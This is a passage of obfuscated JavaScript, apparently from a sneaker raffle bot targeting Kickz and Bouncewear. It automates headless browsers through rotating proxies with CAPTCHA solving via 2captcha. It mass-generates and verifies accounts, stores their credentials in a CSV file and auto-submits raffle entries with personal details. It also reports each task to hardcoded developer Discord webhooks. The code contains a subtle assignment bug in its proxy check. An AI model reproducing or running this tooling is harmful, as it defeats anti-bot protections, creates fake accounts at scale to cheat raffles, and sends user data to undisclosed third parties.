            if (_0x3beaca[_0x2cc397]['Size'] == 'RANDOM') {
                console['log'](_0x21f008() + '\x20[' + _0x4c78af['name'] + ']\x20Task\x20' + (_0x2cc397 + 0x1) + '\x20:\x20Choosing\x20random\x20size');
                const _0x16bfed = await _0xcf2a76['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0x5c5979 => {
                    return _0x5c5979['map'](_0x1e61a5 => _0x1e61a5['href']);
                });
                var _0xf563b4 = Math['round'](Math['random']() * (_0x16bfed['length'] - 0x1));
                await _0xcf2a76['goto']('' + _0x16bfed[_0xf563b4]);
            } else {
                console['log'](_0x21f008() + '\x20[' + _0x4c78af['name'] + ']\x20Task\x20' + (_0x2cc397 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x3beaca[_0x2cc397]['Size']);
                try {
                    const _0x3d73f6 = await _0xcf2a76['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0x3beaca[_0x2cc397]['Size'] + '\x22]\x20>\x20a', _0x368451 => {
                        return _0x368451['map'](_0x18504b => _0x18504b['href']);
                    });
                    await _0xcf2a76['goto']('' + _0x3d73f6[0x0], { 'waitUntil': 'networkidle2' });
                } catch (_0x208d94) {
                    console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x4c78af['name'] + ']\x20Task\x20' + (_0x2cc397 + 0x1) + '\x20:\x20' + _0x208d94 + '\x20Size\x20not\x20found')), _0x2158a2 = 'Size\x20Not\x20Found';
                    var _0x2d7d9d = await _0x5b798c(_0x3beaca[_0x2cc397], _0x4c78af, 'dev', !![], _0x2158a2);
                    _0x1a99a2['errorDEV'] = { 'embeds': [_0x2d7d9d] };
                    _0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '' && await _0x331f59(_0x4c3205['webhook'], _0x1a99a2['errorDEV']);
                    await _0x331f59(_0x40d0b0, _0x1a99a2['errorDEV']);
                    continue;
                }
            }
            await _0xcf2a76['waitForTimeout'](0x258), await _0xcf2a76['type']('#raffle-instagram', '' + _0x3beaca[_0x2cc397]['Follower'], { 'delay': 0x64 }), await _0xcf2a76['waitForTimeout'](0x384), await _0xcf2a76['click']('#raffle-terms'), await _0xcf2a76['waitForTimeout'](0x384), await _0xcf2a76['evaluate'](() => {
                const _0x2bf744 = document['querySelector']('button.btn[name=\x27add\x27]');
                _0x2bf744['click']();
            }), await _0xcf2a76['waitForTimeout'](0xbb8), await _0xcf2a76['waitForSelector']('#checkout_email'), await _0x4e5841(0x3e8), console['log'](_0x21f008() + '\x20[' + _0x4c78af['name'] + ']\x20Task\x20' + (_0x2cc397 + 0x1) + '\x20:\x20Filling\x20Information');
            _0x1776f6 == 'sec' ? await _0xcf2a76['type']('#checkout_email', '' + _0x3beaca[_0x2cc397]['FirstName'] + _0x3beaca[_0x2cc397]['LastName'] + _0x4c3205['catchall'], 0x32) : await _0xcf2a76['type']('#checkout_email', '' + _0x3beaca[_0x2cc397]['Email'], 0x32);
            await _0x4e5841(0x320), await _0xcf2a76['select']('#checkout_shipping_address_country', '' + _0x3beaca[_0x2cc397]['Country']), await _0xcf2a76['waitForTimeout'](0x258), await _0xcf2a76['type']('#checkout_shipping_address_first_name', '' + _0x3beaca[_0x2cc397]['FirstName']), await _0xcf2a76['waitForTimeout'](0x320), await _0xcf2a76['type']('#checkout_shipping_address_last_name', '' + _0x3beaca[_0x2cc397]['LastName']), await _0xcf2a76['waitForTimeout'](0x2bc), await _0xcf2a76['type']('#checkout_shipping_address_address1', _0x3beaca[_0x2cc397]['Address1'] + '\x20' + _0x3beaca[_0x2cc397]['HouseNumber']), await _0xcf2a76['waitForTimeout'](0x2bc), await _0xcf2a76['type']('#checkout_shipping_address_address2', '' + _0x3beaca[_0x2cc397]['Address2']), await _0xcf2a76['waitForTimeout'](0x2bc);
            _0x3beaca[_0x2cc397]['Postcode'] == undefined ? await _0xcf2a76['type']('#checkout_shipping_address_zip', '' + _0x3beaca[_0x2cc397]['Zip']) : await _0xcf2a76['type']('#checkout_shipping_address_zip', '' + _0x3beaca[_0x2cc397]['Postcode']);
            await _0xcf2a76['waitForTimeout'](0x2bc), await _0xcf2a76['type']('#checkout_shipping_address_city', '' + _0x3beaca[_0x2cc397]['City']), await _0xcf2a76['waitForTimeout'](0x2bc), console['log'](_0x21f008() + '\x20[' + _0x4c78af['name'] + ']\x20Task\x20' + (_0x2cc397 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0xcf2a76, _0xcf2a76['evaluate'](() => {
                const _0x43cf01 = document['querySelector']('#continue_button');
                for (var _0x43ed5c = 0x0; _0x43ed5c < 0x5; _0x43ed5c++) {
                    if (_0x43cf01) {
                        _0x43cf01['click'](), _0x43cf01['click']();
                        break;
                    } else
                        _0x4e5841(0xfa0);
                }
            }), await _0xcf2a76['waitForTimeout'](0x1194);
            try {
                await _0xcf2a76['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
            } catch {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x4c78af['name'] + ']\x20Task\x20' + (_0x2cc397 + 0x1) + '\x20:\x20Proxy\x20Error'));
                continue;
            }
            _0xcf2a76['evaluate'](() => {
                const _0x211a0d = document['querySelector']('#continue_button');
                for (var _0x330f64 = 0x0; _0x330f64 < 0x5; _0x330f64++) {
                    if (_0x211a0d) {
                        _0x211a0d['click']();
                        break;
                    } else
                        _0x4e5841(0xfa0);
                }
            }), await _0xcf2a76['waitForTimeout'](0x7d0), console['log'](_0x21f008() + '\x20[' + _0x4c78af['name'] + ']\x20Task\x20' + (_0x2cc397 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0xcf2a76['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0xcf2a76['evaluate'](() => {
                const _0x47b2c6 = document['querySelector']('#continue_button');
                for (var _0x247fe9 = 0x0; _0x247fe9 < 0x5; _0x247fe9++) {
                    if (_0x47b2c6) {
                        _0x47b2c6['click']();
                        break;
                    } else
                        _0x4e5841(0xfa0);
                }
            }), await _0xcf2a76['waitForTimeout'](0x1194), await _0xcf2a76['waitForSelector']('#continue_button'), _0xcf2a76['evaluate'](() => {
                const _0x4e0ace = document['querySelector']('#continue_button');
                for (var _0x5c1b2e = 0x0; _0x5c1b2e < 0x5; _0x5c1b2e++) {
                    if (_0x4e0ace) {
                        _0x4e0ace['click']();
                        break;
                    } else
                        _0x4e5841(0xfa0);
                }
            });
            try {
                await _0xcf2a76['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0xa3d312 = 'no', _0x4fb703(_0x3beaca[_0x2cc397], _0x4c78af), console['log'](_0x108b38['green'](_0x21f008() + '\x20[' + _0x4c78af['name'] + ']\x20Task\x20' + (_0x2cc397 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                if (_0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '')
                    try {
                        await _0x331f59(_0x4c3205['webhook'], _0x1a99a2['succesDEVMSG']);
                    } catch {
                    }
                await _0x4e5841(0xc8), await _0x331f59(_0x45c891, _0x1a99a2['succesDEVMSG']), await _0x4e5841(0xc8);
                try {
                    await _0x331f59(_0x5ca215, _0x1a99a2['succesPUBMSG']);
                } catch {
                }
            } catch (_0x431f3a) {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x4c78af['name'] + ']\x20Task\x20' + (_0x2cc397 + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x431f3a));
            }
        } catch (_0x35660b) {
            console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x4c78af['name'] + ']\x20Task\x20' + (_0x2cc397 + 0x1) + '\x20:\x20' + _0x35660b)), _0x2158a2 = '' + _0x35660b;
            var _0x2d7d9d = await _0x5b798c(_0x3beaca[_0x2cc397], _0x4c78af, 'dev', !![], _0x2158a2);
            _0x1a99a2['errorDEV'] = { 'embeds': [_0x2d7d9d] }, _0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '' && await _0x331f59(_0x4c3205['webhook'], _0x1a99a2['errorDEV']), await _0x331f59(_0x40d0b0, _0x1a99a2['errorDEV']), _0xa3d312 = 'yes';
        } finally {
            _0x35ca1c && _0x35ca1c['close']();
            if (_0xa3d312 == 'yes' && _0x5c7620 != 0x5 && _0x2158a2 != 'Size\x20Not\x20Found') {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x4c78af['name'] + ']\x20Task\x20' + (_0x2cc397 + 0x1) + '\x20:\x20Retrying')), _0x2cc397 = _0x2cc397 - 0x1, _0x5c7620 = _0x5c7620 + 0x1;
                continue;
            }
            _0xa3d312 == 'yes' && _0x5c7620 >= 0x5 && (_0x20b8ba(_0x3beaca[_0x2cc397], _0x4c78af), _0xa3d312 = 'no', _0x5c7620 = 0x0);
            if (_0x2cc397 + 0x1 == _0x3beaca['length']) {
                console['log'](_0x108b38['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x4e5841(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x4c3205['AfewDelay'] + '\x20ms'), await _0x4e5841(_0x4c3205['AfewDelay']);
        }
    }
};
async function _0xec94af(_0x5c8a45, _0x126bfa, _0x5d5ef9, _0x3f5302) {
    _0x4ec495['use'](_0x21618b()), _0x4ec495['use'](_0x480aae({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x4c3205['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x4d991d = 0x0; _0x4d991d < _0x5d5ef9['length']; _0x4d991d++) {
        if (_0x1e73aa != 'yes')
            var _0x1e73aa = '', _0x41eb1b = 0x0;
        _0x4204b1(_0x126bfa['name'] + '\x20Task\x20' + (_0x4d991d + 0x1) + '\x20/\x20' + _0x5d5ef9['length'] + '\x20||\x20File:\x20' + _0x4a41d1 + '\x20Proxies:\x20' + _0x36f446), await _0x3e9f80(_0x5d5ef9, _0x4d991d);
        var _0x1d087b = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x4ca7a9
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x4c3205['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x4351c2
                }
            ]
        }];
        const _0x2e4bf7 = { 'embeds': _0x1d087b };
        var _0x2de9a4 = await _0x5b798c(_0x5d5ef9[_0x4d991d], _0x126bfa, 'acc', ![]);
        const _0x91c4c3 = { 'succesDEVMSG': { 'embeds': [_0x2de9a4] } };
        if (_0x5d5ef9[_0x4d991d]['Email'] == '' || _0x5d5ef9[_0x4d991d]['FirstName'] == '' || _0x5d5ef9[_0x4d991d]['LastName'] == '') {
            console['log'](_0x21f008() + '\x20[' + _0x126bfa['name'] + ']\x20Task\x20' + (_0x4d991d + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        _0x5d5ef9[_0x4d991d]['Password'] == '' && (_0x5d5ef9[_0x4d991d]['Password'] = 'JRaffles23!');
        if (_0x4c3205['useRandomProxy'] = ![])
            var _0x24d664 = _0x3f5302[_0x4d991d]['split'](':');
        else
            var _0x339c6e = Math['round'](Math['random']() * (_0x3f5302['length'] - 0x1)), _0x24d664 = _0x3f5302[_0x339c6e]['split'](':');
        const _0x1b9e26 = await _0x4ec495['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x24d664[0x0] + ':' + _0x24d664[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x5da890 = await _0x1b9e26['newPage']();
            await _0x5da890['authenticate']({
                'username': '' + _0x24d664[0x2],
                'password': '' + _0x24d664[0x3]
            }), console['log'](_0x21f008() + '\x20[' + _0x126bfa['name'] + ']\x20Task\x20' + (_0x4d991d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5da890['setRequestInterception'](!![]), _0x5da890['on']('request', _0x1c8953 => {
                _0x1c8953['resourceType']() === 'image' || _0x1c8953['resourceType']() === 'font' || _0x1c8953['resourceType']() === 'media' ? _0x1c8953['abort']() : _0x1c8953['continue']();
            }), await _0x5da890['goto'](_0x5c8a45), await _0x4e5841(0xbb8), console['log'](_0x21f008() + '\x20[' + _0x126bfa['name'] + ']\x20Task\x20' + (_0x4d991d + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x5da890['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x5da890['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x5da890['waitForSelector']('#button-register'), await _0x4e5841(0x7d0), await _0x5da890['evaluate'](() => {
                const _0x3cd6ce = document['querySelector']('#button-register');
                _0x3cd6ce['click']();
            }), console['log'](_0x21f008() + '\x20[' + _0x126bfa['name'] + ']\x20Task\x20' + (_0x4d991d + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x4e5841(0x1388), await _0x5da890['waitForSelector']('#customer_salutation'), await _0x5da890['select']('#customer_salutation', 'mr'), await _0x4e5841(0x7d0), await _0x5da890['waitForSelector']('#customer_firstname'), await _0x5da890['type']('#customer_firstname', '' + _0x5d5ef9[_0x4d991d]['FirstName']), await _0x4e5841(0x352), await _0x5da890['waitForSelector']('#customer_lastname'), await _0x5da890['type']('#customer_lastname', '' + _0x5d5ef9[_0x4d991d]['LastName']), await _0x4e5841(0x352), await _0x5da890['type']('#email-input', '' + _0x5d5ef9[_0x4d991d]['Email']), await _0x4e5841(0x352), await _0x5da890['type']('#email-confirm-input', '' + _0x5d5ef9[_0x4d991d]['Email']), await _0x4e5841(0x352), await _0x5da890['type']('#register-password', '' + _0x5d5ef9[_0x4d991d]['Password']), await _0x4e5841(0x352), await _0x5da890['type']('#password-confirm', '' + _0x5d5ef9[_0x4d991d]['Password']), await _0x4e5841(0x352), console['log'](_0x21f008() + '\x20[' + _0x126bfa['name'] + ']\x20Task\x20' + (_0x4d991d + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x5da890['click']('#consent'), await _0x4e5841(0x1f4);
            const _0x35324f = await _0x5da890['$']('div.inputErrorMsg.b-form_section-message');
            if (_0x35324f) {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x126bfa['name'] + ']\x20Task\x20' + (_0x4d991d + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                continue;
            }
            await _0x5da890['click']('#buttonRegister');
            try {
                await _0x5da890['waitForSelector']('#verificationCode');
            } catch {
                throw new Error('Account\x20already\x20registered');
            }
            console['log'](_0x108b38['yellow'](_0x21f008() + '\x20[' + _0x126bfa['name'] + ']\x20Task\x20' + (_0x4d991d + 0x1) + '\x20:\x20Account\x20' + _0x5d5ef9[_0x4d991d]['Email'] + '\x20Generated!')), console['log'](_0x108b38['yellow'](_0x21f008() + '\x20[' + _0x126bfa['name'] + ']\x20Task\x20' + (_0x4d991d + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x5d5ef9[_0x4d991d]['Email'])), await _0x4e5841(0x4b0);
            async function _0x2773a5() {
                console['log'](_0x108b38['yellow'](_0x21f008() + '\x20[' + _0x126bfa['name'] + ']\x20Task\x20' + (_0x4d991d + 0x1) + '\x20:\x20Paste\x20your\x20verification\x20code\x20here:'));
                var _0x1d26b0 = await _0x3c06d4['get']('Code');
                return _0x1d26b0['Code'];
            }
            ;
            code = await _0x2773a5(), _0x4e5841(0x320), console['log'](_0x21f008() + '\x20[' + _0x126bfa['name'] + ']\x20Task\x20' + (_0x4d991d + 0x1) + '\x20:\x20Verifying..'), await _0x5da890['type']('#verificationCode', code), await _0x4e5841(0x1f4), await _0x5da890['click']('#buttonVerify'), await _0x4e5841(0x190), await _0x5da890['click']('#buttonVerify'), await _0x4e5841(0x3e8);
            try {
                await _0x5da890['waitForSelector']('div.b-user_greeting'), _0x1e73aa = 'no', console['log'](_0x108b38['green'](_0x21f008() + '\x20[' + _0x126bfa['name'] + ']\x20Task\x20' + (_0x4d991d + 0x1) + '\x20:\x20Account\x20' + _0x5d5ef9[_0x4d991d]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x3fdbd7['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x5d5ef9[_0x4d991d]['Email'] + ',' + _0x5d5ef9[_0x4d991d]['Password'] + ','), console['log'](_0x21f008() + '\x20[' + _0x126bfa['name'] + ']\x20Task\x20' + (_0x4d991d + 0x1) + '\x20:\x20Account\x20' + _0x5d5ef9[_0x4d991d]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                try {
                    _0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '' && await _0x331f59(_0x4c3205['webhook'], _0x91c4c3['succesDEVMSG']);
                } catch {
                }
                await _0x331f59(_0x2055ba, _0x91c4c3['succesDEVMSG']);
            } catch {
                _0x1e73aa = 'no', console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x126bfa['name'] + ']\x20Task\x20' + (_0x4d991d + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x126bfa['name'] + ']\x20Task\x20' + (_0x4d991d + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
            }
        } catch (_0x41729a) {
            console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x126bfa['name'] + ']\x20Task\x20' + (_0x4d991d + 0x1) + '\x20:\x20' + _0x41729a)), _0x1d087b[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x1d087b[0x0]['description'] = '' + _0x41729a, await _0x331f59(_0x40d0b0, _0x2e4bf7), _0x1e73aa = 'yes';
        } finally {
            _0x1b9e26 && _0x1b9e26['close']();
            if (_0x1e73aa == 'yes' && _0x41eb1b != 0x5) {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x126bfa['name'] + ']\x20Task\x20' + (_0x4d991d + 0x1) + '\x20:\x20Retrying')), _0x4d991d = _0x4d991d - 0x1, _0x41eb1b = _0x41eb1b + 0x1;
                continue;
            }
            _0x1e73aa == 'yes' && _0x41eb1b >= 0x5 && (_0x20b8ba(_0x5d5ef9[_0x4d991d], _0x126bfa), _0x1e73aa = 'no', _0x41eb1b = 0x0), console['log']('Waiting\x20for\x20' + _0x4c3205['delay'] + '\x20ms'), await _0x4e5841(_0x4c3205['delay']);
        }
    }
}
async function _0x19fd04(_0x2841d1, _0xc3469a, _0x2826e5) {
    _0x4ec495['use'](_0x21618b()), _0x4ec495['use'](_0x480aae({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x4c3205['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x191c24 = 0x0; _0x191c24 < _0xc3469a['length']; _0x191c24++) {
        var _0x4a5cdf;
        if (_0xb39468 != 'yes')
            var _0xb39468 = '', _0x17ef8d = 0x0;
        _0x4204b1(_0x2841d1['name'] + '\x20Task\x20' + (_0x191c24 + 0x1) + '\x20/\x20' + _0xc3469a['length'] + '\x20||\x20File:\x20' + _0x4a41d1 + '\x20Proxies:\x20' + _0x36f446);
        var _0x412ea2 = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x4ca7a9
                },
                {
                    'name': 'Product',
                    'value': '' + _0xc3469a[_0x191c24]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0xc3469a[_0x191c24]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x4c3205['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x4351c2
                }
            ]
        }], _0x345ef5 = await _0x5b798c(_0xc3469a[_0x191c24], _0x2841d1, 'dev', ![]), _0x1fa13b = await _0x5b798c(_0xc3469a[_0x191c24], _0x2841d1, 'pub', ![]);
        const _0x1f22ba = {
            'succesDEVMSG': { 'embeds': [_0x345ef5] },
            'succesPUBMSG': { 'embeds': [_0x1fa13b] }
        };
        await _0x3e9f80(_0xc3469a, _0x191c24);
        if (_0xc3469a[_0x191c24]['Email'] == '' || _0xc3469a[_0x191c24]['Password'] == '' || _0xc3469a[_0x191c24]['FirstName'] == '' || _0xc3469a[_0x191c24]['LastName'] == '') {
            console['log'](_0x21f008() + '\x20[' + _0x2841d1['name'] + ']\x20Task\x20' + (_0x191c24 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x4c3205['useRandomProxy'] = ![])
            var _0x5d1b4b = _0x2826e5[_0x191c24]['split'](':');
        else
            var _0x2895e0 = Math['round'](Math['random']() * (_0x2826e5['length'] - 0x1)), _0x5d1b4b = _0x2826e5[_0x2895e0]['split'](':');
        const _0x50566a = await _0x4ec495['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x5d1b4b[0x0] + ':' + _0x5d1b4b[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0xb209ac = await _0x50566a['newPage']();
            await _0xb209ac['authenticate']({
                'username': '' + _0x5d1b4b[0x2],
                'password': '' + _0x5d1b4b[0x3]
            }), console['log'](_0x21f008() + '\x20[' + _0x2841d1['name'] + ']\x20Task\x20' + (_0x191c24 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xb209ac['setRequestInterception'](!![]), _0xb209ac['on']('request', _0x222139 => {
                _0x222139['resourceType']() === 'image' || _0x222139['resourceType']() === 'font' || _0x222139['resourceType']() === 'media' ? _0x222139['abort']() : _0x222139['continue']();
            }), await _0xb209ac['goto']('' + _0xc3469a[_0x191c24]['Url'], { 'waitUntil': 'networkidle2' }), await _0x4e5841(0x12c);
            try {
                await _0xb209ac['click']('a[title=\x22Sign\x20In\x22]');
            } catch {
                await _0xb209ac['click']('a[title=\x22sign\x20in\x22]');
            }
            console['log'](_0x21f008() + '\x20[' + _0x2841d1['name'] + ']\x20Task\x20' + (_0x191c24 + 0x1) + '\x20:\x20Logging\x20in'), await _0xb209ac['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xb209ac['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xb209ac['waitForSelector']('#username'), await _0xb209ac['type']('#username', _0xc3469a[_0x191c24]['Email']), await _0xb209ac['waitForSelector']('#password'), await _0xb209ac['type']('#password', _0xc3469a[_0x191c24]['Password']), await _0x4e5841(0x190), await _0xb209ac['click']('#buttonSubmit'), await _0xb209ac['waitForSelector']('div.b-user_greeting'), console['log'](_0x21f008() + '\x20[' + _0x2841d1['name'] + ']\x20Task\x20' + (_0x191c24 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x4e5841(0x1f4), await _0xb209ac['goto']('' + _0xc3469a[_0x191c24]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x21f008() + '\x20[' + _0x2841d1['name'] + ']\x20Task\x20' + (_0x191c24 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0xc3469a[_0x191c24]['Size']);
            let _0x43e023 = _0xc3469a[_0x191c24]['Size']['replace']('.5', '\x201/2');
            await _0xb209ac['click']('button[title=\x22' + _0x43e023 + '\x22]'), await _0x4e5841(0x1f4);
            try {
                await _0xb209ac['click']('button[data-tau=\x22add_new_address\x22]');
            } catch {
            }
            await _0x4e5841(0x12c), console['log'](_0x21f008() + '\x20[' + _0x2841d1['name'] + ']\x20Task\x20' + (_0x191c24 + 0x1) + '\x20:\x20Filling\x20Information'), await _0xb209ac['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x4e5841(0x12c), await _0xb209ac['type']('#dwfrm_raffle_addressFields_firstName', _0xc3469a[_0x191c24]['FirstName']), await _0x4e5841(0x12c), await _0xb209ac['type']('#dwfrm_raffle_addressFields_lastName', _0xc3469a[_0x191c24]['LastName']), await _0x4e5841(0x12c), await _0xb209ac['select']('#dwfrm_raffle_addressFields_country', _0xc3469a[_0x191c24]['Country']), await _0x4e5841(0x12c), await _0xb209ac['type']('#dwfrm_raffle_addressFields_city', _0xc3469a[_0x191c24]['City']), await _0x4e5841(0x12c);
            _0xc3469a[_0x191c24]['Postcode'] == undefined && (_0xc3469a[_0x191c24]['Postcode'] = _0xc3469a[_0x191c24]['Zip']);
            await _0xb209ac['type']('#dwfrm_raffle_addressFields_postalCode', _0xc3469a[_0x191c24]['Postcode']), await _0x4e5841(0x12c), await _0xb209ac['type']('#dwfrm_raffle_addressFields_address1', _0xc3469a[_0x191c24]['Address1']), await _0x4e5841(0x12c), await _0xb209ac['type']('#dwfrm_raffle_addressFields_address2', _0xc3469a[_0x191c24]['HouseNumber']), await _0x4e5841(0x12c), await _0xb209ac['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0xc3469a[_0x191c24]['Address2']), await _0x4e5841(0x12c), await _0xb209ac['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x4e5841(0x12c), await _0xb209ac['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0xc3469a[_0x191c24]['Follower']), await _0x4e5841(0x1f4), await _0xb209ac['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x4e5841(0x1f4), console['log'](_0x21f008() + '\x20[' + _0x2841d1['name'] + ']\x20Task\x20' + (_0x191c24 + 0x1) + '\x20:\x20' + _0x108b38['blue']('Awaiting\x20Paypal\x20Payment')), await _0xb209ac['click']('.b-paypal_button');
            try {
                await _0xb209ac['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0xb39468 = 'no', _0x4fb703(_0xc3469a[_0x191c24], _0x2841d1), console['log'](_0x108b38['green'](_0x21f008() + '\x20[' + _0x2841d1['name'] + ']\x20Task\x20' + (_0x191c24 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '' && await _0x331f59(_0x4c3205['webhook'], _0x1f22ba['succesDEVMSG']), await _0x4e5841(0xc8), await _0x331f59(_0x45c891, _0x1f22ba['succesDEVMSG']), await _0x4e5841(0xc8), await _0x331f59(_0x5ca215, _0x1f22ba['succesPUBMSG']);
            } catch (_0x42351b) {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x2841d1['name'] + ']\x20Task\x20' + (_0x191c24 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x42351b)), _0x4a5cdf = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x42351b;
                var _0x2170a7 = await _0x5b798c(_0xc3469a[_0x191c24], _0x2841d1, 'dev', !![], _0x4a5cdf);
                _0x1f22ba['errorDEV'] = { 'embeds': [_0x2170a7] }, _0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '' && await _0x331f59(_0x4c3205['webhook'], _0x1f22ba['errorDEV']), await _0x331f59(_0x40d0b0, _0x1f22ba['errorDEV']);
            }
        } catch (_0x3eec19) {
            console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x2841d1['name'] + ']\x20Task\x20' + (_0x191c24 + 0x1) + '\x20:\x20' + _0x3eec19)), _0x4a5cdf = '' + _0x3eec19;
            var _0x2170a7 = await _0x5b798c(_0xc3469a[_0x191c24], _0x2841d1, 'dev', !![], _0x4a5cdf);
            _0x1f22ba['errorDEV'] = { 'embeds': [_0x2170a7] }, _0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '' && await _0x331f59(_0x4c3205['webhook'], _0x1f22ba['errorDEV']), await _0x331f59(_0x40d0b0, _0x1f22ba['errorDEV']), _0xb39468 = 'yes';
        } finally {
            _0x50566a && _0x50566a['close']();
            if (_0xb39468 == 'yes' && _0x17ef8d != 0x5) {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x2841d1['name'] + ']\x20Task\x20' + (_0x191c24 + 0x1) + '\x20:\x20Retrying')), _0x191c24 = _0x191c24 - 0x1, _0x17ef8d = _0x17ef8d + 0x1;
                continue;
            }
            _0xb39468 == 'yes' && _0x17ef8d >= 0x5 && (_0x20b8ba(_0xc3469a[_0x191c24], _0x2841d1), _0xb39468 = 'no', _0x17ef8d = 0x0), console['log']('Waiting\x20for\x20' + _0x4c3205['AfewDelay'] + '\x20ms'), await _0x4e5841(_0x4c3205['AfewDelay']);
        }
    }
}
async function _0x267021(_0x4ec658, _0x51554f) {
    _0x4ec495['use'](_0x21618b()), _0x4ec495['use'](_0x480aae({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x4c3205['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x3ce304 = 0x0; _0x3ce304 < bouncewear['length']; _0x3ce304++) {
        await _0x3e9f80(bouncewear, _0x3ce304);
        if (bouncewear[_0x3ce304]['Email'] == '' || bouncewear[_0x3ce304]['Password'] == '' || bouncewear[_0x3ce304]['FirstName'] == '' || bouncewear[_0x3ce304]['LastName'] == '') {
            console['log'](_0x21f008() + '\x20[' + _0x3962b3[taskModule]['name'] + ']\x20Task\x20' + (_0x3ce304 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x4c3205['useRandomProxy'] = ![])
            var _0x1365bb = _0x3e36fc()[_0x3ce304]['split'](':');
        else
            var _0x5301f7 = Math['round'](Math['random']() * (_0x3e36fc()['length'] - 0x1)), _0x1365bb = _0x3e36fc()[_0x5301f7]['split'](':');
        const _0x33f6e4 = await _0x4ec495['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x1365bb[0x0] + ':' + _0x1365bb[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x55c22d = await _0x33f6e4['newPage']();
            await _0x55c22d['authenticate']({
                'username': '' + _0x1365bb[0x2],
